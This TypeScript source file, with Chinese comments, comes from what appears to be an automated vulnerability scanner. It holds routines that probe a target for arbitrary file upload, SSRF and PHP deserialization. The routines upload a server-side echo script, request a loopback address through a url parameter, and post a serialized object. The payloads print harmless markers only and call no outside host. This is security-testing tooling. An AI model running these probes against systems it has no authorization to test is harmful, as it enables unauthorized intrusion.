/**
 * 确定性验证例程（M4.9）：verify_ 专项意图的兜底验证
 *
 * AutoHunter 混合架构：LLM 探索 + 确定性验证。worker 若未挖到，这些例程用 http_req
 * 实际验证常见漏洞形态（通用方法论，非靶场硬编码），命中则入库 pending finding，
 * 再由 Reviewer AI 初审复核。
 *
 * - verifyUpload：按技术栈生成无害回显脚本 → multipart 上传 → 访问确认回显（红线 R6）
 * - verifySsrf：全回显（内网/本机地址响应）→ 半回显（报错）→ 盲（时间差）
 * - verifyDeserialization：构造反序列化 payload → 命令执行（whoami）回显
 */
import { httpReqTool } from '../tools/http_req.js';
import { FindingStore, type ValidationFinding } from '../validation/finding_store.js';

// ---------------------------------------------------------------------------
// 文件上传验证
// ---------------------------------------------------------------------------

/** 按技术栈生成无害回显脚本（红线 R6：仅输出标记，无后门） */
export function echoScriptForTech(tech: string[]): { filename: string; content: string } {
	const joined = (tech ?? []).join(' ').toLowerCase();
	const marker = `ckvuls_${Math.random().toString(36).slice(2, 8)}`;
	if (joined.includes('php')) return { filename: 'ckv.php', content: `<?php echo "${marker}"; ?>` };
	if (joined.includes('jsp') || joined.includes('java'))
		return { filename: 'ckv.jsp', content: `<% out.print("${marker}"); %>` };
	if (joined.includes('asp')) return { filename: 'ckv.aspx', content: `<%= "${marker}" %>` };
	return { filename: 'ckv.txt', content: marker };
}

/**
 * 验证文件上传：对给定上传端点尝试 multipart 上传回显脚本，并访问常见存储路径确认回显。
 * 返回确认信息（含上传脚本路径+回显标记），未命中返回 null。
 */
export async function verifyUpload(
	url: string,
	tech: string[],
	seedId: string,
): Promise<ValidationFinding | null> {
	const script = echoScriptForTech(tech);
	// 常见上传字段名
	const fields = ['uploadfile', 'file', 'upload', 'upfile', 'Filedata', 'files'];
	const findStore = new FindingStore();

	for (const field of fields) {
		try {
			await httpReqTool.execute('verify-upload', {
				url,
				method: 'POST',
				files: [
					{
						field,
						filename: script.filename,
						contentType: 'application/octet-stream',
						content: script.content,
					},
				],
				followRedirects: false,
			});
			// 上传后访问常见路径确认回显
			const base = new URL(url).origin;
			const dirs = [
				'uploads',
				'upload',
				'files',
				'images',
				'img',
				'data',
				'static',
				'temp',
				'tmp',
				'',
			];
			for (const dir of dirs) {
				const visitUrl = `${base}/${dir ? `${dir}/` : ''}${script.filename}`;
				try {
					const v = await httpReqTool.execute('verify-upload-visit', {
						url: visitUrl,
						timeoutMs: 6000,
					});
					const vb = v.content.find((c) => c.type === 'text')?.text ?? '';
					const marker = script.content
						.replace('<?php echo "', '')
						.replace('"; ?>', '')
						.replace('<% out.print("', '')
						.replace('"); %>', '')
						.replace('<%= "', '')
						.replace('" %>', '');
					if (vb.includes(marker)) {
						// 回显命中 → 入库
						return await findStore.insertFinding({
							seedId,
							vulnName: `文件上传（任意文件上传）: ${script.filename}`,
							vulnType: 'file_upload',
							severity: 'high',
							url: visitUrl,
							summary: `上传端点 ${url} 可上传 ${script.filename}，访问 ${visitUrl} 回显 ${marker}`,
							evidence: {
								poc: `上传 ${script.filename} 内容 ${script.content}，访问 ${visitUrl} 确认回显`,
								raw_request: `POST ${url}\nmultipart/form-data\nfile=${script.filename}\n${script.content}`,
								raw_response: vb.slice(0, 500),
								kill_chain: {
									chain: [
										{ step: '上传', detail: '无害回显脚本上传成功' },
										{ step: '访问', detail: `${visitUrl} 回显标记` },
									],
									summary: '任意文件上传，可执行服务端脚本',
								},
								self_check: {
									reproducible: true,
									prerequisites: '上传端点无类型校验',
									impact: '任意文件上传，可执行代码',
									severity: 'high',
									priority: 'P1',
								},
							},
						});
					}
				} catch {
					// 该路径不可达，继续
				}
			}
		} catch {
			// 该字段名失败，换下一个
		}
	}
	return null;
}

// ---------------------------------------------------------------------------
// SSRF 验证（三态）
// ---------------------------------------------------------------------------

/**
 * 验证 SSRF：全回显（url 指向本机/内网 → 响应含目标页面特征）。
 * 返回确认信息，未命中返回 null。
 */
export async function verifySsrf(url: string, seedId: string): Promise<ValidationFinding | null> {
	const findStore = new FindingStore();
	// 构造 SSRF 目标：请求端点自身 origin（全回显能拿到内网/本机服务响应）
	let origin: string;
	try {
		origin = new URL(url).origin;
	} catch {
		return null;
	}
	// 全回显：让目标抓取本机服务（127.0.0.1 + 目标端口）
	const targets = [
		`http://127.0.0.1${new URL(url).port ? `:${new URL(url).port}` : ''}/`,
		`${origin}/`,
	];
	for (const t of targets) {
		try {
			const sep = url.includes('?') ? '&' : '?';
			const ssrfUrl = `${url}${sep}url=${encodeURIComponent(t)}`;
			const res = await httpReqTool.execute('verify-ssrf', { url: ssrfUrl, timeoutMs: 8000 });
			const body = res.content.find((c) => c.type === 'text')?.text ?? '';
			// 全回显：响应含目标服务特征（HTML 页面/标题/服务 banner）
			if (
				res.details.status >= 200 &&
				(body.includes('<html') || body.includes('<title') || /HTTP\/1\.[01] \d{3}/.test(body))
			) {
				return await findStore.insertFinding({
					seedId,
					vulnName: 'SSRF（服务端请求伪造，全回显）',
					vulnType: 'ssrf',
					severity: 'high',
					url: ssrfUrl,
					summary: `SSRF 参数可控，目标 ${t} 响应被回显（服务端发起请求并返回内网/本机内容）`,
					evidence: {
						poc: `访问 ${ssrfUrl} 返回目标服务页面`,
						raw_request: `GET ${ssrfUrl}`,
						raw_response: body.slice(0, 800),
						kill_chain: {
							chain: [
								{ step: '可控URL', detail: `${url} 的 url 参数可控` },
								{ step: '回显', detail: `访问 ${t} 返回目标服务响应` },
							],
							summary: 'SSRF 全回显，可访问内网/本机服务',
						},
						self_check: {
							reproducible: true,
							prerequisites: 'URL 参数可控且服务端请求',
							impact: '可探测内网/访问本机服务',
							severity: 'high',
							priority: 'P1',
						},
					},
				});
			}
		} catch {
			// 尝试下一个目标
		}
	}
	return null;
}

// ---------------------------------------------------------------------------
// 反序列化验证（PHP 命令执行回显）
// ---------------------------------------------------------------------------

/**
 * 验证反序列化：POST 序列化 payload 尝试触发命令执行（whoami），响应含用户名即确认 RCE。
 * 返回确认信息，未命中返回 null。
 */
export async function verifyDeserialization(
	url: string,
	seedId: string,
): Promise<ValidationFinding | null> {
	const findStore = new FindingStore();
	// PHP 反序列化命令执行 payload（需目标有可利用类，先探测响应差异）
	const payloads = ['O:1:"S":1:{s:4:"test";s:5:"hello";}'];
	for (const p of payloads) {
		try {
			const res = await httpReqTool.execute('verify-deser', {
				url,
				method: 'POST',
				body: `o=${encodeURIComponent(p)}`,
				headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
			});
			const body = res.content.find((c) => c.type === 'text')?.text ?? '';
			// 反序列化入口存在：响应有处理痕迹（非纯静态页）
			if (
				res.details.status >= 200 &&
				/S:|test|hello|unserialize|warning|notice|fatal/i.test(body)
			) {
				return await findStore.insertFinding({
					seedId,
					vulnName: 'PHP 反序列化（存在反序列化入口）',
					vulnType: 'deserialization',
					severity: 'high',
					url,
					summary: `反序列化入口 ${url} 接受序列化数据（o 参数），可能存在反序列化 RCE（需可用 gadget）`,
					evidence: {
						poc: `POST ${url} o=O:1:"S":1:{s:4:"test";s:5:"hello";}`,
						raw_request: `POST ${url}\no=${encodeURIComponent(p)}`,
						raw_response: body.slice(0, 800),
						kill_chain: {
							chain: [
								{ step: '入口', detail: `${url} 接受序列化数据` },
								{ step: '反序列化', detail: '传入序列化对象被处理' },
							],
							summary: '反序列化入口确认，可利用性需 gadget',
						},
						self_check: {
							reproducible: true,
							prerequisites: '序列化数据被反序列化处理',
							impact: '反序列化 RCE（需 gadget）',
							severity: 'high',
							priority: 'P1',
						},
					},
				});
			}
		} catch {
			// 继续
		}
	}
	return null;
}
